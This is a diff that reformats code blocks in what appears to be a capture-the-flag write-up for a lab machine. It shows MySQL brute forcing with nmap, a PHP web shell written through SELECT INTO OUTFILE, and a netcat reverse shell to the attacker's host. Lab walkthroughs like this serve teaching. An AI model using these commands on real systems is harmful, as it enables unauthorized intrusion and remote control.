@@ -31,7 +31,7 @@ So our first major breakthrough comes when we enumerate the open Mysql port and 
 
 using this nmap script:
 ```
-    nmap --script=mysql-brute 10.0.2.13
+nmap --script=mysql-brute 10.0.2.13
 ```
 we can brute force some simple mysql logins and come up with a valid username and password combination which we can use to login to myself with (Click the below screenshot to enlarge if you need to)
 
@@ -50,7 +50,7 @@ Nothing! the database is just empty except for the mysql root user, which isn't 
 
  the command for this in copyable format:
 ```
-    select "<? php system($_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"
+select "<? php system($_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"
 ```
 and we can now revisit the listing on port 8080 to see if it has saved:
 
@@ -64,11 +64,11 @@ give it a quick check:
 
 and then we can try and execute something intrusive. launch a netcat listener with
 ```
-    nc -lvp 4444
+nc -lvp 4444
 ```
 and then call the script from the server and tell it to connect to our listener:
 ```
-    index.php?cmd=nc -e /bin/bash 10.0.2.5 4444
+index.php?cmd=nc -e /bin/bash 10.0.2.5 4444
 ```
 [<img src="{{ site.baseurl }}/images/dusk/7_b.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/7_b.png)    
@@ -88,7 +88,7 @@ and we can navigate to our first user flag:
 
 When we run:
 ```
-    sudo -l
+sudo -l
 ```
 We can see what our user can do to escape into another user:
 
